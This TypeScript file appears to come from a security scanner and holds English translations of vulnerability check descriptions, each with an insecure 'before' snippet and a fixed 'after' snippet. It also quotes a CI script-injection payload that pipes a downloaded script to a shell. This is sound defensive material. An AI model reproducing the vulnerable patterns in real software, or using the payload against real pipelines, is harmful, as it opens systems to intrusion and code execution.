import type { Lang } from "./translations.js";

// Traduzioni dei controlli a pattern. Il motore (src/checks/) resta l'unica
// fonte di verità per id, gravità e logica di rilevamento — qui traduciamo
// solo il testo pensato per chi legge, tenuto in un file separato così il
// motore condiviso (CLI, MCP, server) resta invariato e in italiano.
export interface CheckTranslation {
  title: string;
  description: string;
  fix: { before: string; after: string };
}

/**
 * I controlli a pattern (src/checks/) hanno un titolo e una descrizione
 * fissi per ogni checkId, qui traducibili con una semplice voce statica. I
 * controlli di Fase 2 (dipendenze, e in arrivo IaC/cloud config) generano
 * invece testo diverso ad ogni finding (nome pacchetto, versione, ID della
 * vulnerabilità...) — per questi la voce è una funzione che riceve il testo
 * italiano originale e ne deriva la versione nella lingua di destinazione,
 * invece di un oggetto fisso.
 */
type CheckTranslationEntry = CheckTranslation | ((original: CheckTranslation) => CheckTranslation);

type TranslatedCheckLang = Exclude<Lang, "it">;

/**
 * L'italiano è la lingua "nativa" del motore (src/checks/), quindi in
 * italiano restituiamo sempre il testo originale del Check/Finding così
 * com'è. Per ogni altra lingua: usiamo la sua tabella se esiste una voce per
 * quel checkId, altrimenti l'inglese come ripiego (più comprensibile a
 * livello globale dell'italiano), altrimenti l'italiano originale — così una
 * lingua ancora incompleta non mostra mai un testo mancante, solo l'inglese
 * finché non viene tradotta anche lei.
 */
export function translateCheckText<T extends { title: string; description: string; fix: { before: string; after: string } }>(
  checkId: string,
  original: T,
  lang: string
): { title: string; description: string; fix: { before: string; after: string } } {
  if (lang === "it") return original;
  const entry =
    checkTranslations[lang as TranslatedCheckLang]?.[checkId] ?? checkTranslations.en?.[checkId];
  if (!entry) return original;
  return typeof entry === "function" ? entry(original) : entry;
}

// Fase 2 — dependency scanning. Nome pacchetto, versione e ID della
// vulnerabilità (es. GHSA-...) sono lasciati invariati in ogni lingua: sono
// identificatori tecnici, non testo da tradurre. Lo stesso vale per il
// riassunto preso da OSV.dev nella description: i database di vulnerabilità
// pubblici (CVE, GHSA) sono nativamente in inglese anche quando il sito è in
// un'altra lingua — tradurlo rischierebbe di perdere precisione tecnica, per
// questo resta identico in tutte le lingue tranne il titolo e la nota finale.
const vulnerableDependencyEn: CheckTranslationEntry = (original) => ({
  title: original.title.replace("Dipendenza vulnerabile:", "Vulnerable dependency:"),
  description: original.description,
  fix: {
    before: original.fix.before,
    after: original.fix.after.replace(
      "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
      "No fixed version known yet — consider an alternative package or follow the project's updates."
    ),
  },
});

export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<string, CheckTranslationEntry>>> = {
  en: {
    "supabase-service-role-in-client": {
      title: "Supabase's secret key ends up in a browser-facing file",
      description:
        "A variable with a public prefix (e.g. NEXT_PUBLIC_, VITE_) or a client-side file references Supabase's service role key. This key bypasses Row Level Security: if it ends up in the browser bundle, anyone can read it and act as a database administrator.",
      fix: {
        before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
        after: `// app/api/admin/route.ts (server only)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
      },
    },
    "hardcoded-secret": {
      title: "Passwords or secret keys are written directly in the code",
      description:
        "An API key, token, or password appears to be written as a literal value instead of read from an environment variable. Anyone who reads the source code (or the repository, if public) gets that secret.",
      fix: {
        before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
        after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
      },
    },
    "env-file-with-real-values": {
      title: "A file with the project's real passwords is among those analyzed",
      description:
        "A .env file with real values (not a .env.example) is included in the analysis. If this file ends up in a repository or a public deploy, every credential it contains is exposed.",
      fix: {
        before: `# .env (committed by mistake)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
        after: `# .env.example (committed)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env stays out of the repo (.gitignore)`,
      },
    },
    "missing-row-level-security": {
      title: "Anyone can read or modify every user's data",
      description:
        "Row Level Security is disabled, or a policy allows access to anyone (USING (true)) without checking who's making the request. Every authenticated user — or even an anonymous one — can read or modify everyone else's data.",
      fix: {
        before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
        after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
      },
    },
    "sql-injection": {
      title: "A value entered by the user is pasted directly into a database query",
      description:
        "A SQL query is built by concatenating or interpolating a string directly instead of using parameters. If that text comes (even indirectly) from a user, it can alter the query itself — SQL injection.",
      fix: {
        before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
        after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
      },
    },
    "plaintext-password-storage": {
      title: "Passwords don't seem to be protected",
      description:
        "A password field is saved exactly as it arrived in the request, and no hashing function (bcrypt, argon2, scrypt) appears in the file. If the database is compromised, every password is immediately usable.",
      fix: {
        before: `await db.users.insert({ email, password: req.body.password })`,
        after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
      },
    },
    "hardcoded-jwt-secret": {
      title: "The secret used to sign logins is written in plain text in the code",
      description:
        "The secret passed to jwt.sign / jwt.verify (or the JWT_SECRET variable) is a literal value in the code instead of coming from an environment variable. Anyone who reads it can create valid access tokens for any user.",
      fix: {
        before: `jwt.sign(payload, "super-secret-key-123")`,
        after: `jwt.sign(payload, process.env.JWT_SECRET)`,
      },
    },
    "command-injection": {
      title: "The server can be forced to run external commands",
      description:
        "A function that runs system commands (exec, execSync, spawn) receives a string built by interpolation or concatenation. If part of that string comes from user input, whoever controls it can run arbitrary commands on the server.",
      fix: {
        before: "execSync(`convert ${filename} output.png`)",
        after: `execFile("convert", [filename, "output.png"])`,
      },
    },
    "unprotected-new-table": {
      title: "A new table appears to be created without protection",
      description:
        "A SQL migration creates a table but doesn't enable Row Level Security for that same table in the same file. As long as it stays this way, the table starts out with no restriction on who can read or write it.",
      fix: {
        before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
        after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
      },
    },
    "permissive-cors": {
      title: "The site accepts requests from any other website",
      description:
        "The CORS header is set to accept requests from any origin (*), or the cors() middleware is used without restrictions. Any third-party website can call your APIs from the browser of an already-authenticated user.",
      fix: {
        before: `app.use(cors())`,
        after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
      },
    },
    "admin-function-missing-auth": {
      title: "A function with admin permissions doesn't check who's using it",
      description:
        "A route or function whose name suggests admin operations doesn't contain, in the nearby lines, any authentication or role check. Anyone who knows the URL could run it.",
      fix: {
        before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
        after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      },
    },
    ssrf: {
      title: "The site can be forced to run external code",
      description:
        "An outgoing HTTP request (fetch, axios) directly uses a value coming from a user's request as the destination URL. A malicious user can make your server call internal or arbitrary addresses — Server-Side Request Forgery.",
      fix: {
        before: `const data = await fetch(req.query.url)`,
        after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
      },
    },
    "weak-password-hashing": {
      title: "Passwords are protected with a method that's now easy to break",
      description:
        "On the same line, md5() or sha1() are applied to a value tied to a password. These algorithms are too fast to compute: an attacker with the database can try billions of passwords per second.",
      fix: {
        before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
        after: `const hashed = await bcrypt.hash(password, 12)`,
      },
    },
    "xss-dangerous-html": {
      title: "Text written by users could run code in the browser",
      description:
        "Content is inserted into the page as raw HTML (dangerouslySetInnerHTML, v-html, .innerHTML) instead of as plain text. If that content includes user input, it can contain scripts that run in the browser of whoever reads the page.",
      fix: {
        before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
        after: `<div>{comment.text}</div>\n// or, if HTML is needed: DOMPurify.sanitize(comment.text)`,
      },
    },
    "public-storage-bucket": {
      title: "The space for uploaded files is visible to anyone",
      description:
        "A storage bucket (Supabase Storage, S3) is configured as public. If it contains documents, photos, or files uploaded by users, anyone who knows — or guesses — the path can access them without authentication.",
      fix: {
        before: `supabase.storage.createBucket("uploads", { public: true })`,
        after: `supabase.storage.createBucket("uploads", { public: false })\n// serve files with time-limited signed URLs: createSignedUrl(path, 60)`,
      },
    },
    "csrf-state-changing-get": {
      title: "A single link is enough to delete or change data",
      description:
        "A GET route performs an operation that changes data (the path contains delete/remove/update/edit). GET requests run just by visiting a link or loading an image from an external site — the classic stepping stone for a CSRF attack.",
      fix: {
        before: `router.get("/posts/:id/delete", deletePost)`,
        after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
      },
    },
    "insecure-token-storage": {
      title: "Login data saved in the browser isn't well protected",
      description:
        "An access token is saved in localStorage. Unlike an httpOnly cookie, any script running on the page (including a malicious one injected via XSS) can read and steal it.",
      fix: {
        before: `localStorage.setItem("authToken", token)`,
        after: `// set the token as an httpOnly cookie from the server:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
      },
    },
    "open-redirect": {
      title: "The site can be used to redirect to a scam website",
      description:
        "The site redirects the user to an address taken directly from the request (query, body, params) without checking that it's a known domain. A link that looks like it points to your site can actually lead to a phishing page.",
      fix: {
        before: `res.redirect(req.query.next)`,
        after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
      },
    },
    idor: {
      title: "Changing a number in the address could show someone else's data",
      description:
        "A database query directly uses an identifier taken from the URL (req.params.id) without checking, in the nearby lines, that it belongs to the user making the request. Changing the id in the address could give access to another user's data — Insecure Direct Object Reference.",
      fix: {
        before: `const order = await Order.findById(req.params.id)`,
        after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
      },
    },
    "no-login-rate-limit": {
      title: "The login form doesn't block too many attempts in a row",
      description:
        "A login route is defined in the file, but there's no trace of rate-limiting middleware in the same file. Without a limit on attempts, an attacker can try passwords in sequence (brute force) without being slowed down.",
      fix: {
        before: `router.post("/login", loginHandler)`,
        after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
      },
    },
    "sensitive-data-in-logs": {
      title: "Passwords or sensitive data end up in logs",
      description:
        "A call to console.log (or similar) includes a variable called password, token, secret, or apiKey. If these logs end up in an external service or a file, sensitive data stays exposed for much longer than necessary.",
      fix: {
        before: `console.log("login attempt", { email, password })`,
        after: `console.log("login attempt", { email })`,
      },
    },
    "path-traversal": {
      title: "A file on the server can be read or written by choosing the path from outside",
      description:
        "A function that reads, writes, or sends a file gets the path directly from a request value (query, body, params) without checking that it stays inside an allowed folder. An attacker can insert \"../\" to escape the intended folder and read or overwrite arbitrary files on the server (e.g. a configuration file with credentials).",
      fix: {
        before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
        after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Path not allowed")\n  res.sendFile(target)\n})`,
      },
    },
    "nosql-injection": {
      title: "A value entered by the user is executed as code inside a MongoDB query",
      description:
        "MongoDB's $where operator runs server-side JavaScript for every document — if that string is built by concatenating a value that comes from the user, whoever controls it can make arbitrary code run in the database's context, not just alter the filter like with a normal SQL injection.",
      fix: {
        before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
        after: `db.collection.find({ username: username })`,
      },
    },
    ssti: {
      title: "A value entered by the user is interpreted as a template, not as data",
      description:
        "A function that compiles/renders a template receives the ENTIRE template from a request value, instead of using a fixed template and passing only the data. An attacker can write directly in the template engine's syntax (e.g. {{7*7}} for Jinja2) and run code on the server — Server-Side Template Injection, which often leads to arbitrary command execution, not just a display issue like XSS.",
      fix: {
        before: `return render_template_string(request.args.get("name"))`,
        after: `return render_template("profile.html", name=request.args.get("name"))`,
      },
    },
    xxe: {
      title: "The XML parser can be forced to read files or make external requests",
      description:
        "An XML parser (DocumentBuilderFactory) is created without explicitly disabling external entities (DOCTYPE) in the nearby lines. If the parser receives XML from an untrusted source, an attacker can define an external entity to read files on the server or make it contact an address of their choice — XML External Entity.",
      fix: {
        before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
        after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      },
    },
    "terraform-open-security-group": {
      title: "A Terraform security group opens a sensitive port to the whole internet",
      description:
        "A rule with \"cidr_blocks\" that includes 0.0.0.0/0 (any IP address) is near a sensitive port — SSH (22), RDP (3389), or a typical database port (MySQL, Postgres, MongoDB, Redis, SQL Server). Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
        after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # only your private network, or a bastion host\n}`,
      },
    },
    "gcp-firewall-open-to-internet": {
      title: "A Google Cloud firewall rule opens a sensitive port to the whole internet",
      description:
        "A \"google_compute_firewall\" resource with \"source_ranges\" that includes 0.0.0.0/0 (any IP address) allows traffic to a sensitive port — SSH (22), RDP (3389), or a typical database port (MySQL, Postgres, MongoDB, Redis, SQL Server). Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
        after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # only your private network, or a bastion host\n}`,
      },
    },
    "azure-nsg-open-to-internet": {
      title: "An Azure network rule opens a sensitive port to the whole internet",
      description:
        "A network security rule (\"azurerm_network_security_rule\", or a \"security_rule\" block inside \"azurerm_network_security_group\") with \"source_address_prefix\" set to \"*\" or \"0.0.0.0/0\", direction \"Inbound\" and access \"Allow\", near a sensitive port — SSH (22), RDP (3389), or a typical database port. Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
        after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # only your private network, or a bastion host\n}`,
      },
    },
    "terraform-hardcoded-secret": {
      title: "A secret is written as the default value of a Terraform variable",
      description:
        "A variable with a name like password/secret/token/key has a literal value in its \"default\". Unlike a value passed at runtime (tfvars, TF_VAR_* environment variables), a default ends up in the source code — and if the repository is shared or public, anyone can see it, even without access to the Terraform state.",
      fix: {
        before: `variable "db_password" {\n  default = "supersecret123"\n}`,
        after: `variable "db_password" {\n  # no default: pass it with a .tfvars file (outside git) or a TF_VAR_db_password environment variable\n  sensitive = true\n}`,
      },
    },
    "gha-script-injection": {
      title: "A value controlled by an external user goes directly into a CI shell command",
      description:
        'A "run:" command in a GitHub Actions workflow directly interpolates a value like a pull request title, a branch name, or a comment\'s text — all writable by anyone who opens a pull request or comment, even from an external fork. A value like `"; curl malware.sh | sh #` would run arbitrary commands in the CI, with access to every secret available in that workflow.',
      fix: {
        before: `- run: echo "\${{ github.event.pull_request.title }}"`,
        after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passed as an environment variable, never interpolated directly into the command`,
      },
    },
    "gha-pull-request-target-checkout": {
      title: "The workflow runs an external pull request's code with access to the repository's secrets",
      description:
        'The workflow uses "pull_request_target" — which runs with the base repository\'s permissions and secrets even for a pull request opened from an unrelated fork — and checks out the pull request\'s own code ("github.event.pull_request.head"), not the base branch. Whoever opens the pull request effectively gets their own code to run with access to those secrets.',
      fix: {
        before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
        after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Checks out the base branch, not the PR's code — or use\n      # "pull_request" instead of "pull_request_target" if you don't need\n      # the broader permissions/secrets.\n      - uses: actions/checkout@v4`,
      },
    },
    "insecure-deserialization": {
      title: "Request data is deserialized with a format that can execute code",
      description:
        "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), or the node-serialize library (Node) are deserializing a value taken directly from the request. Unlike JSON, these formats can represent and execute code during deserialization itself — whoever controls the value sent can achieve arbitrary code execution on the server.",
      fix: {
        before: `data = pickle.loads(request.data)`,
        after: `import json\ndata = json.loads(request.data)  # JSON never executes code while parsing, unlike pickle`,
      },
    },
    "jwt-none-algorithm": {
      title: 'The code explicitly accepts unsigned JWT tokens ("none" algorithm)',
      description:
        '"none" appears among the algorithms accepted to verify a JWT token. A token with the "none" algorithm has no signature to verify: anyone can build one with any content (e.g. an admin role) and the code would accept it as valid.',
      fix: {
        before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
        after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // never include "none" among the accepted algorithms`,
      },
    },
    "terraform-s3-block-public-access-disabled": {
      title: "Block Public Access is disabled on an S3 bucket defined in Terraform",
      description:
        'One or more of the four protections in "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) are set to false. It doesn\'t mean the bucket is already public, but it removes a safety net that would prevent it from being made public by mistake in the future.',
      fix: {
        before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
        after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
      },
    },
    "terraform-iam-wildcard-policy": {
      title: "An IAM policy defined in Terraform grants full access",
      description:
        'A statement with action "*" and resource "*" grants full access to every AWS service and resource — the same check already done on the live IAM state, here read directly from the code before it\'s even applied. It might be intended for an emergency role, but it should be confirmed: for everyday use, grant only the permissions that are actually needed.',
      fix: {
        before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
        after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
      },
    },
    "gcp-storage-bucket-public": {
      title: "A Google Cloud Storage bucket is made readable by anyone",
      description:
        'A "google_storage_bucket_iam_member" or "google_storage_bucket_iam_binding" resource grants a role to "allUsers" or "allAuthenticatedUsers" — the first makes the bucket readable by anyone on the internet, even without a Google account; the second by anyone with any Google account, not just who should have access.',
      fix: {
        before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
        after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # only whoever should actually have access, not allUsers/allAuthenticatedUsers\n}`,
      },
    },
    "azure-storage-public-access": {
      title: "Public blob access is enabled on an Azure storage account",
      description:
        '"allow_blob_public_access" is set to true on an "azurerm_storage_account": anyone who knows the URL of a blob/container made public can read it, without any authentication.',
      fix: {
        before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
        after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
      },
    },
    "gcp-iam-overly-broad-role": {
      title: "A Google Cloud IAM role grants full access (Owner/Editor)",
      description:
        'A "google_project_iam_binding"/"google_project_iam_member" (or the equivalent at organization/folder level) assigns the primitive role "roles/owner" or "roles/editor" — near-complete access to every service in the project. It might be intended for an emergency account, but it should be confirmed: for everyday use, grant only the more specific predefined roles that are actually needed.',
      fix: {
        before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
        after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # only the predefined role that's actually needed, not roles/owner\n  member  = "user:dev@example.com"\n}`,
      },
    },
    "azure-role-assignment-owner": {
      title: "An Azure role assignment grants full access (Owner)",
      description:
        'An "azurerm_role_assignment" assigns the "Owner" role — full access, including control over other users\' permissions, over the entire assigned scope (subscription, resource group...). It might be intended for an emergency account, but it should be confirmed: for everyday use, grant only the more specific role that\'s actually needed (e.g. "Contributor" on a single resource group).',
      fix: {
        before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
        after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # only the more specific role that's actually needed, not Owner on the whole subscription\n}`,
      },
    },
    "weak-random-token": {
      title: "A security token is generated with a random number generator that isn't cryptographically secure",
      description:
        "A value with a name like token/session/reset/otp/csrf is generated with Math.random() (JS), random.random() (Python), or rand() (PHP) — generators not designed for security, whose sequences are predictable. A token generated this way can be guessed or reconstructed, defeating the purpose it exists for (e.g. a password reset link that anyone could predict).",
      fix: {
        before: `const resetToken = Math.random().toString(36).slice(2);`,
        after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, not Math.random — unpredictable`,
      },
    },
    "ldap-injection": {
      title: "An LDAP filter is built by directly concatenating a request value",
      description:
        'A line that builds an LDAP filter (e.g. "(uid=...)") directly includes a value taken from the request, without any escaping of LDAP special characters. Whoever controls that value can alter the filter\'s logic — for example bypassing an authentication check or reading directory data they shouldn\'t see.',
      fix: {
        before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
        after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP special characters must always be escaped before using them in a filter\nclient.search(base, { filter });`,
      },
    },
    "header-injection": {
      title: "A request value ends up directly in an HTTP response header",
      description:
        "An HTTP response header is set with a value taken directly from the request (query, body, params), without checking that it doesn't contain a line break (CRLF). An attacker can insert additional headers or even an entirely different response — response splitting — potentially manipulating caching, cookies, or the content shown to other users.",
      fix: {
        before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
        after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
      },
    },
    "gha-unpinned-action": {
      title: "A third-party CI action isn't pinned to a precise version (commit SHA)",
      description:
        'The workflow uses a third-party action referenced by tag or branch (e.g. "@v1", "@main") instead of by commit SHA. Whoever maintains it — or whoever compromises their account — can move that reference to a different commit at any time, silently changing what runs in the CI, with access to its secrets. A commit SHA always points to the exact same code.',
      fix: {
        before: `uses: some-org/some-action@v1`,
        after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, pinned to the commit SHA — update the SHA when you update the version`,
      },
    },
    "gha-excessive-permissions": {
      title: "The workflow grants itself every token permission instead of only the ones it uses",
      description:
        '"permissions: write-all" grants the workflow\'s GITHUB_TOKEN write access to everything — issues, pull requests, packages, deployments — even if the workflow only uses some of it. If a step in the workflow is compromised (a malicious dependency, an injected script), those broader permissions increase what whoever exploits it can do.',
      fix: {
        before: `permissions: write-all`,
        after: `permissions:\n  contents: read\n  pull-requests: write  # only the permissions the workflow actually uses`,
      },
    },
    "insecure-cookie-flags": {
      title: "A session or authentication cookie is set without the Secure and HttpOnly flags",
      description:
        'A cookie with a name resembling session/auth/token is set without "httpOnly" and "secure" among its options. Without httpOnly, JavaScript on the page — including code injected via XSS — can read that cookie. Without secure, it can also be sent over an unencrypted HTTP connection.',
      fix: {
        before: `res.cookie("session", sessionId)`,
        after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
      },
    },
    "vulnerable-dependency": vulnerableDependencyEn,
    "docker-hardcoded-secret": {
      title: "A secret is written directly in an ENV or ARG instruction in the Dockerfile",
      description:
        "A variable with a name like password/secret/token/key has a literal value in an ENV or ARG instruction. Unlike a .env file (which normally doesn't end up in the image), this value gets baked into the Docker image itself — anyone who can pull it or inspect the layer history can recover it, even if the line is removed in a later version of the Dockerfile.",
      fix: {
        before: `ENV DB_PASSWORD=supersecret123`,
        after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passed with: docker build --build-arg DB_PASSWORD=*** (or, better yet,\n# a BuildKit secret mount, which never ends up in the layer history)`,
      },
    },
    "docker-missing-user": {
      title: "The Dockerfile doesn't set a non-root user",
      description:
        "No USER instruction in the Dockerfile: without one, the container runs as root. If an attacker manages to run code inside the container (e.g. by exploiting a vulnerable library), being root inside the container makes an escape to the host — or a wider impact on the surrounding system — easier.",
      fix: {
        before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
        after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
      },
    },
    "docker-unpinned-base-image": {
      title: 'The Dockerfile\'s base image uses the ":latest" tag',
      description:
        'A FROM instruction explicitly uses the ":latest" tag instead of a precise version. "latest" changes over time: the same build, redone at a different moment, can get a different version of the base image — a non-reproducible build, and an unwanted update can arrive without anyone having decided it should.',
      fix: {
        before: `FROM node:latest`,
        after: `FROM node:20.11-slim`,
      },
    },
    "docker-add-remote-url": {
      title: "The Dockerfile downloads a remote file with ADD instead of COPY",
      description:
        "An ADD instruction with an http/https URL downloads a file from the internet during the build, with no integrity check and with the content invisible in the repository. If that URL is ever compromised, the build pulls in arbitrary content without anyone noticing just by reading the Dockerfile.",
      fix: {
        before: `ADD https://example.com/install.sh /tmp/install.sh`,
        after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
      },
    },
    "k8s-privileged-container": {
      title: "A container in the Kubernetes manifest runs as privileged",
      description:
        '"privileged: true" in a container\'s securityContext disables almost all the usual isolation between container and host: the container can access the host\'s devices, change its network configuration, and in many cases effectively gain root access to the machine running it. Almost never needed for a normal app.',
      fix: {
        before: `securityContext:\n  privileged: true`,
        after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # only the capabilities actually needed`,
      },
    },
    "k8s-plaintext-secret-env": {
      title: "A secret is written in plain text in a Kubernetes manifest's env variable",
      description:
        'An environment variable with a name like password/secret/token/key has a literal value ("value:") instead of being read from a Secret ("valueFrom.secretKeyRef"). The manifest itself — often committed to a repository — therefore contains the secret in plain text, visible even to someone who can only read the configuration, not necessarily run commands in the cluster.',
      fix: {
        before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
        after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
      },
    },
    "k8s-run-as-root": {
      title: "A container in the Kubernetes manifest is set to run as root",
      description:
        '"runAsUser: 0" or "runAsNonRoot: false" in the securityContext explicitly force the container to run as root. If an attacker manages to run code inside the container (e.g. by exploiting a vulnerable library), being root inside the container makes an escape to the host — or a wider impact — easier.',
      fix: {
        before: `securityContext:\n  runAsUser: 0`,
        after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
      },
    },
    "k8s-privilege-escalation": {
      title: "A container in the Kubernetes manifest can gain more privileges than it started with",
      description:
        '"allowPrivilegeEscalation: true" in the securityContext lets a process inside the container gain more privileges than the process that started it (e.g. through a setuid binary). Combined with a vulnerability in the application, it\'s one more step toward running code with more privileges than intended.',
      fix: {
        before: `securityContext:\n  allowPrivilegeEscalation: true`,
        after: `securityContext:\n  allowPrivilegeEscalation: false`,
      },
    },
    "k8s-host-namespace-access": {
      title: "A pod in the Kubernetes manifest shares the host's network, processes, or shared memory",
      description:
        '"hostNetwork", "hostPID" or "hostIPC" set to true take the pod out of its normal isolation: hostNetwork exposes the pod on the host\'s network (bypassing the cluster\'s network policies), hostPID gives it visibility into every process on the host machine, hostIPC gives it access to the host\'s shared memory. Almost never needed for a normal app — typically only for low-level system/monitoring tools.',
      fix: {
        before: `spec:\n  hostNetwork: true`,
        after: `spec:\n  hostNetwork: false`,
      },
    },
    "k8s-missing-run-as-non-root": {
      title: "The Kubernetes manifest doesn't explicitly enforce running as a non-root user",
      description:
        'No "runAsNonRoot" anywhere in the manifest (neither at pod nor at container level): without setting it, a container runs as whatever user its image defines — often root by default, if the image itself hasn\'t changed that. Setting it explicitly to true makes the pod fail to start if the image still tries to run as root, instead of only finding out after an incident.',
      fix: {
        before: `containers:\n  - name: app\n    image: myapp:1.0`,
        after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
      },
    },
    "gitlab-ci-script-injection": {
      title: 'A value controlled by an external user passes through a second shell in the GitLab CI pipeline',
